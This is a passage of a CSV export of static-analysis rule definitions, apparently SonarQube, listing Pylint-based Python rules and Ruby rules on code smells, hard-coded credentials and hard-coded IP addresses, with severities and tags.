      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS104'>S104</a> instead.</p>",Pylint:C0302,py,Python,"Used when a module has too many lines, reducing its readability.
      <p>This rule is deprecated, use {rule:python:S104} instead.</p>",Too many lines in module,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when the last line in a file is missing a newline.
               <p>While Python interpreters typically do not require line
               end character(s) on the last line, other programs processing Python
               source files may do, and it is simply good practice to have it.</p>
               <p>Added in Pylint 1.0.0.</p>
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS113'>S113</a> instead.</p>",Pylint:C0304,py,Python,"Used when the last line in a file is missing a newline.
               <p>While Python interpreters typically do not require line
               end character(s) on the last line, other programs processing Python
               source files may do, and it is simply good practice to have it.</p>
               <p>Added in Pylint 1.0.0.</p>
               <p>This rule is deprecated, use {rule:python:S113} instead.</p>",Final newline missing,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Used when a function call does not pass a mandatory keyword-only argument.,Pylint:E1125,py,Python,Used when a function call does not pass a mandatory keyword-only argument.,Missing mandatory keyword argument in call,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when an assignment is done on a function call but the inferred function returns nothing but None.,Pylint:E1128,py,Python,Used when an assignment is done on a function call but the inferred function returns nothing but None.,"Assigning result of a function call, where the function returns None",[],MAJOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Used when an except handler uses raise as its first or only operator. This is useless because it raises back the exception immediately. Remove the raise operator or the entire try-except-raise block!,Pylint:W0706,py,Python,Used when an except handler uses raise as its first or only operator. This is useless because it raises back the exception immediately. Remove the raise operator or the entire try-except-raise block!,The except handler raises immediately,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Indicates that a set of similar lines has been detected among multiple file. This usually means that the code should be refactored to avoid this duplication.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=common-py%3ADuplicatedBlocks'>DuplicatedBlocks</a> instead.</p>",Pylint:R0801,py,Python,"Indicates that a set of similar lines has been detected among multiple file. This usually means that the code should be refactored to avoid this duplication.
      <p>This rule is deprecated, use {rule:common-py:DuplicatedBlocks} instead.</p>",Similar lines,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when a local variable is accessed before its assignment.,Pylint:E0601,py,Python,Used when a local variable is accessed before its assignment.,Using variable before assignment,[],MAJOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when Pylint has been unable to import a module.,Pylint:F0401,py,Python,Used when Pylint has been unable to import a module.,Unable to import module,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Emitted when a subscripted value doesn't support subscription (i.e. doesn't define __getitem__ method).,Pylint:E1136,py,Python,Emitted when a subscripted value doesn't support subscription (i.e. doesn't define __getitem__ method).,Subscripted value doesn't support subscription,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Emitted when an object does not support item assignment (i.e. doesn't define __setitem__ method).,Pylint:E1137,py,Python,Emitted when an object does not support item assignment (i.e. doesn't define __setitem__ method).,Object does not support item assignment,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Emitted when an object does not support item deletion (i.e. doesn't define __delitem__ method).,Pylint:E1138,py,Python,Emitted when an object does not support item deletion (i.e. doesn't define __delitem__ method).,Object does not support item deletion,[],MAJOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when a function or method has too many branches, making it hard to follow.
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AFunctionComplexity'>FunctionComplexity</a> instead.</p>",Pylint:R0912,py,Python,"Used when a function or method has too many branches, making it hard to follow.
               <p>This rule is deprecated, use {rule:python:FunctionComplexity} instead.</p>",Too many branches,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when a function or method has too many statements. You should then split it in smaller functions / methods.,Pylint:R0915,py,Python,Used when a function or method has too many statements. You should then split it in smaller functions / methods.,Too many statements,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Emitted when an instance in membership test expression doesn't implement membership protocol (__contains__/__iter__/__getitem__).,Pylint:E1135,py,Python,Emitted when an instance in membership test expression doesn't implement membership protocol (__contains__/__iter__/__getitem__).,Unsupported membership test,[],MAJOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,"Used when an operation is done against an exception, but the operation is not valid for the exception in question. Usually emitted when having binary operations between exceptions in except handlers.",Pylint:W0716,py,Python,"Used when an operation is done against an exception, but the operation is not valid for the exception in question. Usually emitted when having binary operations between exceptions in except handlers.",Invalid exception operation,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Emitted when a unary operand is used on an object which does not support this type of operation.,Pylint:E1130,py,Python,Emitted when a unary operand is used on an object which does not support this type of operation.,Invalid unary operand type,[],MAJOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when a single item in parentheses follows an if, for, or other keyword.
      <p>This rule was added in Pylint 1.1.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1110'>S1110</a> instead.</p>",Pylint:C0325,py,Python,"Used when a single item in parentheses follows an if, for, or other keyword.
      <p>This rule was added in Pylint 1.1.0.</p>
      <p>This rule is deprecated, use {rule:python:S1110} instead.</p>",Unnecessary parentheses,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Used when an async context manager is used with an object that does not implement the async context management protocol. This message can't be emitted when using Python < 3.5.,Pylint:E1701,py,Python,Used when an async context manager is used with an object that does not implement the async context management protocol. This message can't be emitted when using Python < 3.5.,Async context manager doesn't implement __aenter__ and __aexit__,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when a metaclass class method has a first argument named differently than the value specified in valid-metaclass-classmethod-first-arg option (default to ""mcs""), recommended to easily differentiate them from regular instance methods.",Pylint:C0204,py,Python,"Used when a metaclass class method has a first argument named differently than the value specified in valid-metaclass-classmethod-first-arg option (default to ""mcs""), recommended to easily differentiate them from regular instance methods.",Metaclass class method first argument,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when a wrong number of spaces is used around an operator, bracket or block opener.",Pylint:C0326,py,Python,"Used when a wrong number of spaces is used around an operator, bracket or block opener.","Wrong number of spaces around an operator, bracket, or comma, or before a block opener",[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when a name cannot be found in a module.,Pylint:E0611,py,Python,Used when a name cannot be found in a module.,Undefined name in module,[],MAJOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Used when an `yield` or `yield from` statement is found inside an async function. This message can't be emitted when using Python < 3.5.,Pylint:E1700,py,Python,Used when an `yield` or `yield from` statement is found inside an async function. This message can't be emitted when using Python < 3.5.,Yield inside async function,[],MAJOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when class has too many parent classes, try to reduce this to get a simpler (and so easier to use) class.",Pylint:R0901,py,Python,"Used when class has too many parent classes, try to reduce this to get a simpler (and so easier to use) class.",Too many ancestors,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when class has too many instance attributes, try to reduce this to get a simpler (and so easier to use) class.",Pylint:R0902,py,Python,"Used when class has too many instance attributes, try to reduce this to get a simpler (and so easier to use) class.",Too many instance attributes,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Used when more than one statement are found on the same line.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AOneStatementPerLine'>OneStatementPerLine</a> instead.</p>",Pylint:C0321,py,Python,"<p>Used when more than one statement are found on the same line.</p>
      <p>This rule is deprecated, use {rule:python:OneStatementPerLine} instead.</p>",More than one statement on a single line,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when class has too many public methods, try to reduce this to get a simpler (and so easier to use) class.",Pylint:R0904,py,Python,"Used when class has too many public methods, try to reduce this to get a simpler (and so easier to use) class.",Too many public methods,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Emitted when a dict key is not hashable (i.e. doesn't define __hash__ method).,Pylint:E1140,py,Python,Emitted when a dict key is not hashable (i.e. doesn't define __hash__ method).,Dict key is unhashable,[],MAJOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when you use the ""global"" statement at the module level since it has no effect",Pylint:W0604,py,Python,"Used when you use the ""global"" statement at the module level since it has no effect",Using the global statement at the module level,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when you use the ""global"" statement to update a global variable. Pylint just try to discourage this usage. That doesn't mean you cannot use it !",Pylint:W0603,py,Python,"Used when you use the ""global"" statement to update a global variable. Pylint just try to discourage this usage. That doesn't mean you cannot use it !",Using the global statement,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,Used when an exception handler assigns the exception to an existing name,Pylint:W0623,py,Python,Used when an exception handler assigns the exception to an existing name,Redefining name in exception handler,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,"In Python, a tuple is actually created by the comma symbol, not by the parentheses. Unfortunately, one can actually create a tuple by misplacing a trailing comma, which can lead to potential weird bugs in your code. You should always use parentheses explicitly for creating a tuple.",Pylint:R1707,py,Python,"In Python, a tuple is actually created by the comma symbol, not by the parentheses. Unfortunately, one can actually create a tuple by misplacing a trailing comma, which can lead to potential weird bugs in your code. You should always use parentheses explicitly for creating a tuple.",Disallow trailing comma tuple,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an imported module or variable is not used from a `'from X import *'` style import.,Pylint:W0614,py,Python,Used when an imported module or variable is not used from a `'from X import *'` style import.,Unused import from wildcard import,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the basestring built-in function is referenced (missing from Python 3),Pylint:W1602,py,Python,Used when the basestring built-in function is referenced (missing from Python 3),basestring built-in referenced,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when a source line cannot be decoded using the specified source file encoding. This message can't be emitted when using Python >= 3.0.
        <p>This rule was added in Pylint 1.0.0.</p>",Pylint:W0512,py,Python,"Used when a source line cannot be decoded using the specified source file encoding. This message can't be emitted when using Python >= 3.0.
        <p>This rule was added in Pylint 1.0.0.</p>",Source line cannot be decoded using the specified source file encoding,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the buffer built-in function is referenced (missing from Python 3),Pylint:W1603,py,Python,Used when the buffer built-in function is referenced (missing from Python 3),buffer built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the apply built-in function is referenced (missing from Python 3),Pylint:W1601,py,Python,Used when the apply built-in function is referenced (missing from Python 3),apply built-in referenced,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when a loop variable (i.e. defined by a for loop or a list comprehension or a generator expression) is used outside the loop.,Pylint:W0631,py,Python,Used when a loop variable (i.e. defined by a for loop or a list comprehension or a generator expression) is used outside the loop.,Using possibly undefined loop variable,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when parameter unpacking is specified for a function(Python 3 doesn't allow it),Pylint:E1602,py,Python,Used when parameter unpacking is specified for a function(Python 3 doesn't allow it),Parameter unpacking specified,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used when the deprecated ""<>"" operator is used instead of ""!="". This is removed in Python 3. This message can't be emitted when using Python >= 3.0.",Pylint:E1607,py,Python,"Used when the deprecated ""<>"" operator is used instead of ""!="". This is removed in Python 3. This message can't be emitted when using Python >= 3.0.",Use of the <> operator,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Python3 will not allow implicit unpacking of exceptions in except clauses. See http://www.python.org/dev/peps/pep-3110/,Pylint:E1603,py,Python,Python3 will not allow implicit unpacking of exceptions in except clauses. See http://www.python.org/dev/peps/pep-3110/,Implicit unpacking of exceptions is not supported in Python 3,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used when the alternate raise syntax 'raise foo, bar' is used instead of 'raise foo(bar)'.",Pylint:E1604,py,Python,"Used when the alternate raise syntax 'raise foo, bar' is used instead of 'raise foo(bar)'.","Use raise ErrorClass(args) instead of raise ErrorClass, args.",[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used when the deprecated ""``"" (backtick) operator is used instead of the str() function.",Pylint:E1605,py,Python,"Used when the deprecated ""``"" (backtick) operator is used instead of the str() function.",Use of the `` operator,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a print statement is used (`print` is a function in Python 3),Pylint:E1601,py,Python,Used when a print statement is used (`print` is a function in Python 3),print statement used,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the xrange built-in function is referenced (missing from Python 3),Pylint:W1613,py,Python,Used when the xrange built-in function is referenced (missing from Python 3),xrange built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a __coerce__ method is defined (method is not used by Python 3),Pylint:W1614,py,Python,Used when a __coerce__ method is defined (method is not used by Python 3),__coerce__ method defined,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an import relative to the package directory is detected. This message can't be emitted when using Python >= 3.0.,Pylint:W0403,py,Python,Used when an import relative to the package directory is detected. This message can't be emitted when using Python >= 3.0.,Relative import,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the StandardError built-in function is referenced (missing from Python 3),Pylint:W1611,py,Python,Used when the StandardError built-in function is referenced (missing from Python 3),StandardError built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the unicode built-in function is referenced (missing from Python 3),Pylint:W1612,py,Python,Used when the unicode built-in function is referenced (missing from Python 3),unicode built-in referenced,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when `from module import *` is detected.,Pylint:W0401,py,Python,Used when `from module import *` is detected.,Wildcard import,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Invalid assignment to self or cls in instance or class method respectively.,Pylint:W0642,py,Python,Invalid assignment to self or cls in instance or class method respectively.,Invalid assignment in method,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when Pylint has been unable to check methods signature compatibility for an unexpected reason. Please report this kind if you don't make sense of it.,Pylint:F0202,py,Python,Used when Pylint has been unable to check methods signature compatibility for an unexpected reason. Please report this kind if you don't make sense of it.,Unable to check methods signature,[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the reduce built-in function is referenced (missing from Python 3),Pylint:W1610,py,Python,Used when the reduce built-in function is referenced (missing from Python 3),reduce built-in referenced,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when an unexpected error occurred in bad format
               detection. Please report the error if it occurs.",Pylint:F0321,py,Python,"Used when an unexpected error occurred in bad format
               detection. Please report the error if it occurs.",Format detection error,[],MAJOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,"Used when a variable is defined but might not be used. The possibility comes from the fact that locals() might be used, which could consume or not the said variable",Pylint:W0641,py,Python,"Used when a variable is defined but might not be used. The possibility comes from the fact that locals() might be used, which could consume or not the said variable",Possibly unused variable,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the long built-in function is referenced (missing from Python 3),Pylint:W1608,py,Python,Used when the long built-in function is referenced (missing from Python 3),long built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the execfile built-in function is referenced (missing from Python 3),Pylint:W1606,py,Python,Used when the execfile built-in function is referenced (missing from Python 3),execfile built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the raw_input built-in function is referenced (missing from Python 3),Pylint:W1609,py,Python,Used when the raw_input built-in function is referenced (missing from Python 3),raw_input built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the cmp built-in function is referenced (missing from Python 3),Pylint:W1604,py,Python,Used when the cmp built-in function is referenced (missing from Python 3),cmp built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the file built-in function is referenced (missing from Python 3),Pylint:W1607,py,Python,Used when the file built-in function is referenced (missing from Python 3),file built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when the coerce built-in function is referenced (missing from Python 3),Pylint:W1605,py,Python,Used when the coerce built-in function is referenced (missing from Python 3),coerce built-in referenced,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Indexing exceptions will not work on Python 3. Use `exception.args[index]` instead.,Pylint:W1624,py,Python,Indexing exceptions will not work on Python 3. Use `exception.args[index]` instead.,Indexing exceptions will not work on Python 3,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a string exception is raised. This will not work on Python 3.,Pylint:W1625,py,Python,Used when a string exception is raised. This will not work on Python 3.,Raising a string exception,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when an object's next() method is called (Python 3 uses the next() built- in function),Pylint:W1622,py,Python,Used when an object's next() method is called (Python 3 uses the next() built- in function),Called a next() method on an object,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used for calls to dict.iterkeys(), itervalues() or iteritems() (Python 3 lacks these methods)",Pylint:W1620,py,Python,"Used for calls to dict.iterkeys(), itervalues() or iteritems() (Python 3 lacks these methods)",Calling a dict.iter*() method,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a metaclass is specified by assigning to __metaclass__ (Python 3 specifies the metaclass as a class statement argument),Pylint:W1623,py,Python,Used when a metaclass is specified by assigning to __metaclass__ (Python 3 specifies the metaclass as a class statement argument),Assigning to a class's __metaclass__ attribute,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used for calls to dict.viewkeys(), viewvalues() or viewitems() (Python 3 lacks these methods)",Pylint:W1621,py,Python,"Used for calls to dict.viewkeys(), viewvalues() or viewitems() (Python 3 lacks these methods)",Calling a dict.view*() method,[],MINOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,Env manipulation functions support only string type arguments. See https://docs.python.org/3/library/os.html#os.getenv.,Pylint:E1507,py,Python,Env manipulation functions support only string type arguments. See https://docs.python.org/3/library/os.html#os.getenv.,Env manipulation functions does not support type argument,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used for non-floor division w/o a float literal or ``from __future__ import division`` (Python 3 returns a float for int division unconditionally),Pylint:W1619,py,Python,Used for non-floor division w/o a float literal or ``from __future__ import division`` (Python 3 returns a float for int division unconditionally),division w/o __future__ statement,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a __setslice__ method is defined (method is not used by Python 3),Pylint:W1617,py,Python,Used when a __setslice__ method is defined (method is not used by Python 3),__setslice__ method defined,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when an import is not accompanied by ``from __future__ import absolute_import`` (default behaviour in Python 3),Pylint:W1618,py,Python,Used when an import is not accompanied by ``from __future__ import absolute_import`` (default behaviour in Python 3),import missing `from __future__ import absolute_import`,[],MINOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when a __delslice__ method is defined (method is not used by Python 3),Pylint:W1615,py,Python,Used when a __delslice__ method is defined (method is not used by Python 3),__delslice__ method defined,[],MINOR,[],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as ""oauthToken"", ""secret"", ...</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",ruby:S2068,ruby,Ruby,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as ""oauthToken"", ""secret"", ...</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",Credentials should not be hard-coded,"[{'key': 'credentialWords', 'htmlDesc': 'Comma separated list of words identifying potential credentials', 'defaultValue': 'password,passwd,pwd', 'type': 'STRING'}]",BLOCKER,"['cert', 'cwe', 'owasp-a2', 'sans-top25-porous']",VULNERABILITY
2018-09-05T14:35:18+0200,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if !filename.nil?
  if File.file?(filename) || File.directory?(filename)
    # ...
  end
end

if a then
  unless b then
    # ...
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def isFileOrDirectory(filename)
  File.file?(filename) || File.directory?(filename)
end
# ...

if !filename.nil? &amp;&amp; isFileOrDirectory(filename)
  # ...
end

if a &amp;&amp; !b then
  # ...
end
</pre>",ruby:S1066,ruby,Ruby,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if !filename.nil?
  if File.file?(filename) || File.directory?(filename)
    # ...
  end
end

if a then
  unless b then
    # ...
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def isFileOrDirectory(filename)
  File.file?(filename) || File.directory?(filename)
end
# ...

if !filename.nil? &amp;&amp; isFileOrDirectory(filename)
  # ...
end

if a &amp;&amp; !b then
  # ...
end
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ip = ""192.168.12.42""; // Noncompliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",ruby:S1313,ruby,Ruby,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ip = ""192.168.12.42""; // Noncompliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MINOR,['cert'],SECURITY_HOTSPOT
2018-09-05T14:35:18+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-ruby:InsufficientBranchCoverage,ruby,Ruby,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2018-09-05T14:35:18+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-ruby:DuplicatedBlocks,ruby,Ruby,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2018-09-05T14:35:18+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-ruby:FailedUnitTests,ruby,Ruby,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2018-09-05T14:35:18+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-ruby:InsufficientCommentDensity,ruby,Ruby,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-ruby:InsufficientLineCoverage,ruby,Ruby,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2018-09-05T14:35:18+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-ruby:SkippedUnitTests,ruby,Ruby,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>",ruby:ParsingError,ruby,Ruby,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
